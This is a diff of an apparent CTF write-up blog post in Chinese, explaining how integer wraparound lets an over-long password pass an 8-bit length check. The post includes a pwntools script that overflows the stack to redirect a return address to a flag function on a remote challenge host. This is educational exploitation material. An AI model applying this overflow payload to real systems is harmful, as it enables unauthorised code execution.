@@ -20,12 +20,12 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="溢出距离   类型 占用字节数 取值范围    int 4 -2147483648~2147483647   short int 2 -32768~32767   unsigned int 4 0~4294967295   unsigned short int 2 0~65535   65535D&#x3D;0000 1111 1111 1111 1111B 65536D&#x3D;0001 0000 0000 00">
+<meta name="description" content="溢出距离    类型 占用字节数 取值范围     int 4 -2147483648~2147483647   short int 2 -32768~32767   unsigned int 4 0~4294967295   unsigned short int 2 0~65535    65535D&#x3D;0000 1111 1111">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AD_int_overflow">
 <meta property="og:url" content="http://example.com/2021/03/10/AD-int-overflow/index.html">
 <meta property="og:site_name" content="划水骗分二十年，没人比我更懂蒻">
-<meta property="og:description" content="溢出距离   类型 占用字节数 取值范围    int 4 -2147483648~2147483647   short int 2 -32768~32767   unsigned int 4 0~4294967295   unsigned short int 2 0~65535   65535D&#x3D;0000 1111 1111 1111 1111B 65536D&#x3D;0001 0000 0000 00">
+<meta property="og:description" content="溢出距离    类型 占用字节数 取值范围     int 4 -2147483648~2147483647   short int 2 -32768~32767   unsigned int 4 0~4294967295   unsigned short int 2 0~65535    65535D&#x3D;0000 1111 1111">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2021/03/10/AD-int-overflow/1.png">
 <meta property="og:image" content="http://example.com/2021/03/10/AD-int-overflow/2.png">
@@ -217,57 +217,57 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="溢出距离"><a href="#溢出距离" class="headerlink" title="溢出距离"></a>溢出距离</h2><table>
+        <h2 id="溢出距离">溢出距离</h2>
+<table>
 <thead>
-<tr>
-<th align="center">类型</th>
-<th align="center">占用字节数</th>
-<th align="center">取值范围</th>
+<tr class="header">
+<th style="text-align: center;">类型</th>
+<th style="text-align: center;">占用字节数</th>
+<th style="text-align: center;">取值范围</th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">int</td>
-<td align="center">4</td>
-<td align="center">-2147483648~2147483647</td>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">int</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">-2147483648~2147483647</td>
 </tr>
-<tr>
-<td align="center">short int</td>
-<td align="center">2</td>
-<td align="center">-32768~32767</td>
+<tr class="even">
+<td style="text-align: center;">short int</td>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">-32768~32767</td>
 </tr>
-<tr>
-<td align="center">unsigned int</td>
-<td align="center">4</td>
-<td align="center">0~4294967295</td>
+<tr class="odd">
+<td style="text-align: center;">unsigned int</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">0~4294967295</td>
 </tr>
-<tr>
-<td align="center">unsigned short int</td>
-<td align="center">2</td>
-<td align="center">0~65535</td>
+<tr class="even">
+<td style="text-align: center;">unsigned short int</td>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">0~65535</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>65535D=0000 <strong>1111 1111 1111 1111</strong>B</p>
 <p>65536D=0001 <strong>0000 0000 0000 0000</strong>B</p>
 <p>65537D=0001 <strong>0000 0000 0000 0001</strong>B</p>
 <p>在一个unsigned short int 类型的变量中，由于溢出部分直接忽略（加粗部分为有效值），故65536D=0D，65537D=1D</p>
-<h2 id="题目中的溢出"><a href="#题目中的溢出" class="headerlink" title="题目中的溢出"></a>题目中的溢出</h2><img src="/2021/03/10/AD-int-overflow/1.png" class>
-
+<h2 id="题目中的溢出">题目中的溢出</h2>
+<img src="/2021/03/10/AD-int-overflow/1.png" class>
 <p>得出&amp;buf能存储409个字符</p>
 <img src="/2021/03/10/AD-int-overflow/2.png" class>
-
 <p>&amp;buf的参数传递给s</p>
 <p>v3用于存储s的长度</p>
 <p>unsigned _ int8 v3;代表v3的大小为8位，即能存储的数字范围为0到255，256相当于0，257相当于1。</p>
 <p>也就是说，如果s字符串的长度在259到264之间，也能通过if。</p>
-<h2 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h2><img src="/2021/03/10/AD-int-overflow/3.png" class>
-
+<h2 id="覆盖">覆盖</h2>
+<img src="/2021/03/10/AD-int-overflow/3.png" class>
 <img src="/2021/03/10/AD-int-overflow/4.png" class>
-
 <p>这里涉及字符串拷贝，拷贝的目的地在栈中，栈长度为14h+4h</p>
 <p>只要通过溢出覆盖check-passwd函数的返回地址，返回到what is this函数去执行里面的代码，就可以得到我们需要的flag</p>
-<p>第一步<br>4h+4h=20D+4D=24 覆盖掉用于拷贝的栈24个字节<br>第二步<br>跳转到what is this的地址 p32（0x0804868B）<br>p32大小为4个字节，至此已输入了28个字节<br>第三步<br>补充字节直到密码长度为259到264之间</p>
+<p>第一步 4h+4h=20D+4D=24 覆盖掉用于拷贝的栈24个字节 第二步 跳转到what is this的地址 p32（0x0804868B） p32大小为4个字节，至此已输入了28个字节 第三步 补充字节直到密码长度为259到264之间</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47792</span>)</span><br><span class="line">flag = <span class="number">0x0804868B</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;your father&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">24</span> + p32(flag) + <span class="string">&quot;a&quot;</span>*<span class="number">232</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>完结撒花</p>
 
     </div>
